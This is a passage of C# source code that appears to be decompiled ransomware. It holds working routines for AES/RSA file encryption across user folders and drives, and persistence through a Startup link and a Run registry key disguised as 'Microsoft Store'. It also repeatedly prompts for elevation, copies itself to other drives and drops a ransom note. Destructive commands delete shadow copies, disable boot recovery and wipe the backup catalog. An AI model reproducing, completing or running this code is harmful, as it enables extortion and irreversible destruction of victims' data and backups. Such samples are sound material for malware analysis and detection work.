		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	public static void EncryptFile(string file)
	{
		byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
		string text = CreatePassword(20);
		byte[] bytes = Encoding.UTF8.GetBytes(text);
		byte[] inArray = AES_Encrypt(bytesToBeEncrypted, bytes);
		File.WriteAllText(file, "<EncryptedKey>" + RSAEncrypt(text, rsaKey()) + "<EncryptedKey>" + Convert.ToBase64String(inArray));
		File.Move(file, file + "." + RandomStringForExtension(4));
	}

	public static string RSAEncrypt(string textToEncrypt, string publicKeyString)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(1024);
		try
		{
			rSACryptoServiceProvider.FromXmlString(publicKeyString.ToString());
			byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: true);
			return Convert.ToBase64String(inArray);
		}
		finally
		{
			rSACryptoServiceProvider.PersistKeyInCsp = false;
		}
	}

	private static void lookForDirectories()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\")
			{
				encryptDirectory(driveInfo.ToString());
			}
		}
		string location = userDir + userName + "\\Desktop";
		string location2 = userDir + userName + "\\Links";
		string location3 = userDir + userName + "\\Contacts";
		string location4 = userDir + userName + "\\Desktop";
		string location5 = userDir + userName + "\\Documents";
		string location6 = userDir + userName + "\\Downloads";
		string location7 = userDir + userName + "\\Pictures";
		string location8 = userDir + userName + "\\Music";
		string location9 = userDir + userName + "\\OneDrive";
		string location10 = userDir + userName + "\\Saved Games";
		string location11 = userDir + userName + "\\Favorites";
		string location12 = userDir + userName + "\\Searches";
		string location13 = userDir + userName + "\\Videos";
		encryptDirectory(location);
		encryptDirectory(location2);
		encryptDirectory(location3);
		encryptDirectory(location4);
		encryptDirectory(location5);
		encryptDirectory(location6);
		encryptDirectory(location7);
		encryptDirectory(location8);
		encryptDirectory(location9);
		encryptDirectory(location10);
		encryptDirectory(location11);
		encryptDirectory(location12);
		encryptDirectory(location13);
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory));
	}

	private static void copyRoaming(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
			processStartInfo.WorkingDirectory = text;
			Process process = new Process();
			process.StartInfo = processStartInfo;
			if (process.Start())
			{
				Environment.Exit(1);
			}
			return;
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text2);
		processStartInfo2.WorkingDirectory = text;
		Process process2 = new Process();
		process2.StartInfo = processStartInfo2;
		if (process2.Start())
		{
			Environment.Exit(1);
		}
	}

	private static void copyResistForAdmin(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
		processStartInfo.UseShellExecute = true;
		processStartInfo.Verb = "runas";
		processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
		processStartInfo.WorkingDirectory = text;
		ProcessStartInfo startInfo = processStartInfo;
		Process process = new Process();
		process.StartInfo = startInfo;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			try
			{
				Process.Start(startInfo);
				Environment.Exit(1);
				return;
			}
			catch (Win32Exception ex)
			{
				if (ex.NativeErrorCode == 1223)
				{
					copyResistForAdmin(processName);
				}
				return;
			}
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		try
		{
			Process.Start(startInfo);
			Environment.Exit(1);
		}
		catch (Win32Exception ex2)
		{
			if (ex2.NativeErrorCode == 1223)
			{
				copyResistForAdmin(processName);
			}
		}
	}

	private static void addLinkToStartup()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		string text = Process.GetCurrentProcess().ProcessName;
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + text + ".url");
		string location = Assembly.GetExecutingAssembly().Location;
		streamWriter.WriteLine("[InternetShortcut]");
		streamWriter.WriteLine("URL=file:///" + location);
		streamWriter.WriteLine("IconIndex=0");
		string text2 = location.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text2);
	}

	private static void addAndOpenNote()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		try
		{
			File.WriteAllLines(text, messages);
			Thread.Sleep(500);
			Process.Start(text);
		}
		catch
		{
		}
	}

	private static void registryStartup()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("Microsoft Store", Assembly.GetExecutingAssembly().Location);
		}
		catch
		{
		}
	}

	private static void spreadIt(string spreadName)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\" && !File.Exists(driveInfo.ToString() + spreadName))
			{
				try
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + spreadName);
				}
				catch
				{
				}
			}
		}
	}

	private static void runCommand(string commands)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/C " + commands;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo = processStartInfo;
		process.Start();
		process.WaitForExit();
	}

	private static void deleteShadowCopies()
	{
		runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
	}

	private static void disableRecoveryMode()
	{
		runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
	}

	private static void deleteBackupCatalog()
	{
		runCommand("wbadmin delete catalog -quiet");
	}

	public static void SetWallpaper(string base64)
	{
		if (base64 != "")
		{
			try
			{
				string text = Path.GetTempPath() + RandomString(9) + ".jpg";
				File.WriteAllBytes(text, Convert.FromBase64String(base64));
				SystemParametersInfo(20u, 0u, text, 3u);
			}
			catch
			{
			}
		}
	}
}
